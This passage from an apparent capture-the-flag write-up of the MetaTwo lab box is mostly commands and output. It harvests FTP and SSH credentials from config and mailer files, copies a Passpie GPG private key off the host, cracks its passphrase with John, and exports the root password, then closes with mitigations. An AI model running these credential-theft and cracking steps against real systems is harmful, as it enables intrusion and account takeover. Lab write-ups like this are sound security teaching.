USF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg== 
```

I found the database credentials in this file. I tried them to connect as admin to the site, on SSH, and on FTP, but it failed. I looked again at the file and found some FTP credentials.

```php
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', 'REDACTED' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
```

I used them to connect to the FTP server and found a mailler script.

```bash
$ ftp ftp.metapress.htb
Connected to target.
220 ProFTPD Server (Debian) [::ffff:10.129.14.57]
Name (ftp.metapress.htb:ehogue): metapress.htb
331 Password required for metapress.htb
Password:
230 User metapress.htb logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||19395|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer complete

ftp> cd mailer
250 CWD command successful

ftp> ls
229 Entering Extended Passive Mode (|||24763|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
226 Transfer complete

ftp> get send_email.php
local: send_email.php remote: send_email.php
229 Entering Extended Passive Mode (|||54510|)
150 Opening BINARY mode data connection for send_email.php (1126 bytes)
100% |**********************************************************************************************************************************************************************************************|  1126       10.03 MiB/s    00:00 ETA
226 Transfer complete
1126 bytes received in 00:00 (35.84 KiB/s)
```

The file `send_email.php` contained more credentials.

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "REDACTED";
```

I used them to SSH to the server and got the user flag.

```bash
$ ssh jnelson@target
jnelson@target's password:
Permission denied, please try again.
jnelson@target's password:
Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 25 12:51:26 2022 from 10.10.14.23

jnelson@meta2:~$ cat user.txt
REDACTED
```

## Getting root

Once on the server, I tried the obvious things to escalate privileges. I could not run `sudo` and I did not find any suspicious suid binaries.

```bash
jnelson@meta2:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for jnelson:
Sorry, user jnelson may not run sudo on meta2.

jnelson@meta2:~$ find / -perm /u=s 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/umount
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

I listed the content of the user's home folder and found a folder called `.passpie`. I did not know what [Passpie](https://passpie.readthedocs.io/en/latest/) was before. But a quick google showed that it stored passwords.

```bash
jnelson@meta2:~$ ls -la
total 32
drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 .
drwxr-xr-x 3 root    root    4096 Oct  5 15:12 ..
lrwxrwxrwx 1 root    root       9 Jun 26 15:59 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26 15:46 .bash_logout
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26 15:46 .bashrc
drwxr-xr-x 3 jnelson jnelson 4096 Oct 25 12:51 .local
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .passpie
-rw-r--r-- 1 jnelson jnelson  807 Jun 26 15:46 .profile
-rw-r----- 1 jnelson jnelson   33 Nov  5 20:02 user.txt

jnelson@meta2:~$ ls .passpie/
ssh

jnelson@meta2:~$ ls .passpie/ssh/
jnelson.pass  root.pass

jnelson@meta2:~$ cat .passpie/ssh/root.pass
comment: ''
fullname: root@ssh
login: root
modified: 2022-06-26 08:58:15.621572
name: ssh
password: '-----BEGIN PGP MESSAGE-----


  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2

  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km

  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED

  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf

  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg

  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw

  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr

  lpF0RatbxQGWBks5F3o=

  =uh1B

  -----END PGP MESSAGE-----
  '

jnelson@meta2:~$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛

jnelson@meta2:~$ passpie export plain.txt
Passphrase:
Aborted!
```

It contained the root password, but I needed a passphrase to access it.

I found a `.keys` file that contained a GPG public and private key. I downloaded the keys to my machine, created a file with only the private key, and used John to crack it.

```bash
$ scp jnelson@target:/home/jnelson/.passpie/.keys .
jnelson@target's password:
jnelson@target's password:
.keys                                                                              100% 5243    80.5KB/s   00:00

$ cat .keys
-----BEGIN PGP PUBLIC KEY BLOCK-----
...
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----
...
-----END PGP PRIVATE KEY BLOCK-----


$ /usr/sbin/gpg2john private.key > hash.txt

File private.key

$ john hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
0g 0:00:00:25 7.80% 1/3 (ETA: 19:08:51) 0g/s 57.34p/s 57.34c/s 57.34C/s sspiege..sspieby
0g 0:00:00:26 8.06% 1/3 (ETA: 19:08:53) 0g/s 57.34p/s 57.34c/s 57.34C/s cal..oPa
0g 0:00:00:28 8.50% 1/3 (ETA: 19:09:00) 0g/s 57.03p/s 57.03c/s 57.03C/s spiePas..spieAut
0g 0:00:00:31 10.43% 1/3 (ETA: 19:08:28) 0g/s 57.05p/s 57.05c/s 57.05C/s auto2..autopasspie2
0g 0:00:05:01 38.65% 1/3 (ETA: 19:16:29) 0g/s 55.74p/s 55.74c/s 55.74C/s YpPasspie..YpasspieAuto
0g 0:00:05:02 38.74% 1/3 (ETA: 19:16:30) 0g/s 55.70p/s 55.70c/s 55.70C/s ZgAuto..Zgeneratedby
0g 0:00:05:39 40.84% 1/3 (ETA: 19:17:21) 0g/s 53.82p/s 53.82c/s 53.82C/s ]localpasspie..]lpasspie
0g 0:00:05:40 40.93% 1/3 (ETA: 19:17:21) 0g/s 53.77p/s 53.77c/s 53.77C/s ^gby..^generatedlocal
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
REDACTED         (Passpie)
1g 0:00:21:28 DONE 2/3 (2022-11-05 19:24) 0.000776g/s 42.82p/s 42.82c/s 42.82C/s blessing..passw0rd
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now that I had the password for the vault decoded, I went back to the server and extracted the root password from Passpie.

```bash
jnelson@meta2:~$ passpie export plain.txt
Passphrase:
jnelson@meta2:~$ cat plain.txt
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'REDACTED'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'REDACTED'
handler: passpie
version: 1.0
```

I then used the password to `su` as root and read the flag.

```bash
jnelson@meta2:~$ su -
Password:
root@meta2:~# cat /root/root.txt
REDACTED
```

## Mitigation

The first issue with this box is the outdated components with known vulnerabilities. The SQL Injection in BookingPress and the XXE in WordPress have been fixed. A simple update would have prevented access to the box.

The passwords are also an issue. The SSH password of a user should not have been in clear in a file. Especially not in a file that is available through FTP. The password used to access Passpie was also very weak. Most passwords on the box were better, but the one that protect access to the root password was weak. Also, the password vault should probably not be hosted on the web server.